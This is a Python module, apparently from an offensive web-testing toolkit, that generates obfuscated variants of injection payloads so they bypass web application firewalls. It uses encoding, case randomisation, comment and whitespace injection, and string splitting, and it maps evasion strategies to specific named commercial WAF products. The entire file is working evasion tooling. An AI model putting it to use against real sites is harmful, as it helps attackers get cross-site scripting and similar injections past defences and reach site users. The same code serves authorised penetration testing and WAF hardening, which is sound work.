"""
obfuscator — encodes and transforms payloads to bypass waf rules
applies encoding, case tricks, and structural transformations
"""

import html
import logging
import random
import re
import urllib.parse

logger = logging.getLogger(__name__)

# known waf evasion encodings
ENCODING_STRATEGIES = [
    "unicode_escape",
    "hex_escape",
    "html_entity",
    "url_encode",
    "double_url_encode",
    "mixed_case",
    "tab_newline_inject",
    "comment_inject",
    "concat_split",
]


def obfuscate_payloads(
    payloads: list[dict],
    waf_name: str | None = None,
    strategies: list[str] | None = None,
    max_per_payload: int = 3,
) -> list[dict]:
    """
    generate obfuscated variants for each payload.
    if waf_name is provided, prefer strategies known to work against it.
    returns originals + obfuscated variants.
    """
    active_strategies = strategies or _pick_strategies(waf_name)
    all_results: list[dict] = list(payloads)
    seen = {p["payload"] for p in payloads}

    for original in payloads:
        text = original["payload"]
        chosen = random.sample(
            active_strategies, min(max_per_payload, len(active_strategies))
        )

        for strategy_name in chosen:
            encoder = STRATEGY_MAP.get(strategy_name)
            if not encoder:
                continue
            encoded = encoder(text)
            if encoded and encoded != text and encoded not in seen:
                seen.add(encoded)
                all_results.append({
                    **original,
                    "payload": encoded,
                    "technique": f"obfuscated:{strategy_name}",
                    "length": len(encoded),
                })

    logger.info(
        f"obfuscated {len(payloads)} payloads into {len(all_results)} total "
        f"using strategies={active_strategies}"
    )
    return all_results


def _pick_strategies(waf_name: str | None) -> list[str]:
    """select best strategies for a given waf"""
    waf_preferences = {
        "cloudflare": ["unicode_escape", "html_entity", "comment_inject", "mixed_case"],
        "akamai": ["double_url_encode", "tab_newline_inject", "concat_split"],
        "aws_waf": ["unicode_escape", "hex_escape", "html_entity"],
        "sucuri": ["mixed_case", "comment_inject", "tab_newline_inject"],
        "imperva": ["unicode_escape", "double_url_encode", "concat_split"],
        "modsecurity": ["hex_escape", "html_entity", "tab_newline_inject", "mixed_case"],
        "wordfence": ["unicode_escape", "comment_inject", "url_encode"],
        "f5_bigip": ["double_url_encode", "hex_escape", "concat_split"],
    }
    if waf_name and waf_name.lower().replace(" ", "_") in waf_preferences:
        return waf_preferences[waf_name.lower().replace(" ", "_")]
    return ["unicode_escape", "html_entity", "mixed_case", "url_encode"]


def _unicode_escape(payload: str) -> str | None:
    """convert key characters to unicode escape sequences"""
    replacements = {
        "<": "\\u003c", ">": "\\u003e", "'": "\\u0027", '"': "\\u0022",
        "/": "\\u002f", "(": "\\u0028", ")": "\\u0029",
    }
    result = payload
    chars_to_encode = random.sample(
        list(replacements.keys()),
        min(3, len(replacements)),
    )
    for ch in chars_to_encode:
        if ch in result:
            result = result.replace(ch, replacements[ch], 1)
    return result if result != payload else None


def _hex_escape(payload: str) -> str | None:
    """convert characters to hex escape sequences for js contexts"""
    match = re.search(r"[a-zA-Z]{3,}", payload)
    if not match:
        return None
    word = match.group(0)
    hex_word = "".join(f"\\x{ord(c):02x}" for c in word)
    return payload.replace(word, hex_word, 1)


def _html_entity(payload: str) -> str | None:
    """encode characters as html entities"""
    result = payload
    targets = ["<", ">", "'", '"', "/"]
    encoded_any = False
    for ch in targets:
        if ch in result and random.random() > 0.4:
            entity = f"&#{ord(ch)};"
            result = result.replace(ch, entity, 1)
            encoded_any = True
    return result if encoded_any else None


def _url_encode(payload: str) -> str | None:
    """percent-encode special characters"""
    targets = {"<": "%3C", ">": "%3E", "'": "%27", '"': "%22", " ": "%20", "/": "%2F"}
    result = payload
    encoded_any = False
    for ch, enc in targets.items():
        if ch in result:
            result = result.replace(ch, enc, 1)
            encoded_any = True
    return result if encoded_any else None


def _double_url_encode(payload: str) -> str | None:
    """double percent-encode special characters"""
    targets = {
        "<": "%253C", ">": "%253E", "'": "%2527",
        '"': "%2522", " ": "%2520", "/": "%252F",
    }
    result = payload
    encoded_any = False
    for ch, enc in targets.items():
        if ch in result:
            result = result.replace(ch, enc, 1)
            encoded_any = True
    return result if encoded_any else None


def _mixed_case(payload: str) -> str | None:
    """randomize case of alphabetic characters in tags and keywords"""
    keywords = ["script", "alert", "onerror", "onload", "img", "svg", "body", "iframe"]
    result = payload
    changed = False
    for kw in keywords:
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        match = pattern.search(result)
        if match:
            mixed = "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in match.group(0)
            )
            if mixed != match.group(0):
                result = result[:match.start()] + mixed + result[match.end():]
                changed = True
    return result if changed else None


def _tab_newline_inject(payload: str) -> str | None:
    """inject tabs or newlines between tag name and attributes"""
    separators = ["\t", "\n", "\r\n", "\r", "\x0b", "\x0c"]
    match = re.search(r"(<\w+)\s", payload)
    if not match:
        return None
    sep = random.choice(separators)
    idx = match.end(1)
    return payload[:idx] + sep + payload[idx + 1:]


def _comment_inject(payload: str) -> str | None:
    """inject html comments to break pattern matching"""
    match = re.search(r"(<)(\w+)", payload)
    if not match:
        return None
    return payload[:match.end(1)] + "<!--x-->" + payload[match.start(2):]


def _concat_split(payload: str) -> str | None:
    """split javascript strings using concatenation"""
    match = re.search(r"'([^']{4,})'", payload)
    if match:
        s = match.group(1)
        mid = len(s) // 2
        split_str = f"'{s[:mid]}'+'{s[mid:]}'"
        return payload[:match.start()] + split_str + payload[match.end():]

    match = re.search(r'"([^"]{4,})"', payload)
    if match:
        s = match.group(1)
        mid = len(s) // 2
        split_str = f'"{s[:mid]}"+"{s[mid:]}"'
        return payload[:match.start()] + split_str + payload[match.end():]

    return None


STRATEGY_MAP = {
    "unicode_escape": _unicode_escape,
    "hex_escape": _hex_escape,
    "html_entity": _html_entity,
    "url_encode": _url_encode,
    "double_url_encode": _double_url_encode,
    "mixed_case": _mixed_case,
    "tab_newline_inject": _tab_newline_inject,
    "comment_inject": _comment_inject,
    "concat_split": _concat_split,
}
